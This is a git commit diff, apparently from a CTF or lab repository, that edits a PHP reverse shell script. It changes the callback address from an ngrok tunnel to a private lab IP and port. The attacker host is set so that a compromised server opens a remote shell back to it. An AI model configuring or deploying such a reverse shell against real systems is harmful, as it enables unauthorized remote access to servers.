7b47ad8bda5e0ee8d7b10041ca3dd55b716bd16c
Zer0Sploit <64222071+Zer0Sploit@users.noreply.github.com>
2022-04-10 03:12:41 +0400

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '4.tcp.ngrok.io';  // CHANGE THIS
-$port = 19401;       // CHANGE THIS
+$ip = '10.10.14.8';  // CHANGE THIS
+$port = 3434;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
